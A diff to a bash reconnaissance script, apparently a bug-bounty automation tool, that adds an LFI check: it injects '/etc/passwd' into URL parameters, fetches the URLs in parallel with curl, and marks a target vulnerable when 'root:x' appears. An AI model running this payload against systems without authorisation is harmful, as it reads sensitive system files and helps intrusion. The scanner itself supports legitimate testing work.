@@ -919,6 +919,23 @@ crlf_checks(){
 	fi
 }
 
+lfi(){
+	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ]
+		then
+			printf "${bgreen}#######################################################################\n"
+			printf "${bblue} LFI checks ${reset}\n"
+			start=`date +%s`
+			cat ${domain}_lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | anew -q ${domain}_lfi_confirmed.txt && touch $called_fn_dir/.${FUNCNAME[0]}
+			end=`date +%s`
+			getElapsedTime $start $end
+			printf "${bblue}\n LFI Finished in ${runtime}${reset}\n"
+			printf "${bblue} Results are saved in ${domain}_lfi_confirmed.txt ${reset}\n"
+			printf "${bgreen}#######################################################################\n"
+		else
+			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
+	fi
+}
+
 deleteOutScoped(){
 	if [ -z "$1" ]
 	then
@@ -995,6 +1012,7 @@ all(){
 			open_redirect
 			ssrf_checks
 			crlf_checks
+			lfi
 			if [ "$DEEP" = true ] ; then
 				jschecks
 			fi
@@ -1022,6 +1040,7 @@ all(){
 		open_redirect
 		ssrf_checks
 		crlf_checks
+		lfi
 		if [ "$DEEP" = true ] ; then
 			jschecks
 		fi
@@ -1148,6 +1167,7 @@ while getopts ":hd:-:l:x:vaisxwgto:" opt; do
 			open_redirect
 			ssrf_checks
 			crlf_checks
+			lfi
 			if [ "$DEEP" = true ] ; then
 				jschecks
 			fi
